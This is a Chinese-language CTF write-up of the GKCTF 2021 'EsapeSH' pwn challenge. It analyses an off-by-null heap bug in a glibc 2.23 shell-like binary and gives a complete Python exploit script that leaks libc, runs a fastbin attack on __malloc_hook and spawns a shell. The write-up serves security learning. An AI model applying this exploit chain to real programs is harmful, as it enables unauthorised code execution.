# GKCTF-2021-EsapeSH



### 总结

根据本题，学习与收获有：

- 碰到分支比较复杂，流程比较长的题目，首先定位一下有没有泄露出`flag`的地方，有没有执行`system("/bin/sh")`的地方，可以快速定位到漏洞点
- 对于`off by null`漏洞，需要借助系统残留的`fd`和`bk`指针进行`unlink`，而且一般是三明治结构，低地址的`chunk`是被`unlink`的对象，中间夹着可能正在使用的`chunk`，高地址的`chunk`则是被释放，并触发合并操作
- 有些版本的`2.23`已经加上了对`presize`的检查，需要注意伪造
- `dl_iterate_phdr`函数会迭代访问所有的共享对象，然后每个对象都调用回调函数进行处理，可以对共享`so`进行操作

<!-- more -->

### 题目分析

#### checksec

![image-20210801171527766](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210801171527766.png)

保护全开，根据给的`libc.so.6`可以查到版本位`2.23`

#### 函数分析

本题主要是实现了`bash`的部分功能，感觉可以参考着出个题。这里只分析主要的函数。

![image-20210801172507100](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210801172507100.png)

##### main

![image-20210801171805125](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210801171805125.png)

主要流程为：

- 初始化三个文件流
- 获取主机名、用户名等进行登录
- 获取到当前的路径，然后获取用户的输入
- 处理用户的输入，用空格分隔用户的输入，并且每个子串都调用`malloc`分配一个`chunk`，存储用户输入的字符串
- 判断输入的第一个子串是否是一个有效的命令，如果是有效的命令，则调用`exec_cmd`进行相应的处理，否则抛出个错误
- 释放给用户输入字符分配的内存



##### get_input_process

![image-20210801172254038](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210801172254038.png)





##### exec_cmd

就是根据第一个子串判断是否执行对应的命令

![image-20210801172425677](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210801172425677.png)

#### 漏洞点

漏洞点找到了两个：

- `get_input_process`中的`strcpy`存在`off by null`漏洞

  ![image-20210801172721267](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210801172721267.png)

- `monitor`命令中，如果`__malooc_hook`的前`7`个字符位`monitor`，则会执行`system("/bin/sh")`

  ![image-20210801172816981](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210801172816981.png)

### 利用思路

利用步骤：

- 使用`off by null`先堆风水
- 利用`echo`来泄露出`main_arena+88`的地址
- 利用`0x70`大小的`fastbin chunk`分配到`__malloc_hook`上方，修改为`monitor`即可拿到题目给的`shell`

需要注意的是，在伪造`presize`和`size`的时候，需要用`strcpy`来逐步一个字节一个字节的去刷零

### exp

```python
from pwncli import *

cli_script()

p = gift['io']

def exec_cmd(*cmd):
    jo = " "
    if isinstance(cmd[0], bytes):
        jo = b" "
    p.sendlineafter("$ ", jo.join(cmd).strip())

# four chunks
exec_cmd("a" * 0x90, "a" * 0x60, "a" * 0xf0, "a" * 0x10)

# off by null
exec_cmd("a" * 0x68)

# clear
for i in range(1, 9):
    exec_cmd("a" * (0x68 - i))

# unlink
exec_cmd("a" * 0x60 + "\x10\x01", "a" * 0xf0)

# # split chunk 0x110 ...
exec_cmd("a" * (0x100 - 1), "a" * 0x30, "a" * 0x30, "a" * 0x30, "a" * 0x30)


# clear and set 0x71
exec_cmd("a" * 0x9f)
for i in range(1, 7):
    exec_cmd("a" * (0x9f - i - 1) + "\x71")


# leak addr
exec_cmd("echo", "a" * (0x60 - 1), "a" * (0x90 - 1))

leak_libc_addr = p.recvuntil(" a")[:-2]
leak_libc_addr = u64(leak_libc_addr.ljust(8, b"\x00"))
log_address("leak_libc_addr", leak_libc_addr)

libc_base_addr = leak_libc_addr - 0x3c4b78
log_address("libc_base_addr", libc_base_addr)

exec_cmd("a" * 0xa7)
exec_cmd("a" * 0xa6)

target = libc_base_addr + 0x3c4b10 - 0x23
exec_cmd(b"a"*0xa0+p64(target)[:-2])

# fastbin attack
exec_cmd("a" * 0x9f)
for i in range(1, 7):
    exec_cmd("a" * (0x9f - i - 1) + "\x71")

exec_cmd("monitor", "a" * 0x60, "a"*0x13 + "monitora" + "a" * 0x45)

p.interactive()
```



远程打：

![image-20210801202006219](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210801202006219.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2021-08-01-gkctf-2021-esapesh/  

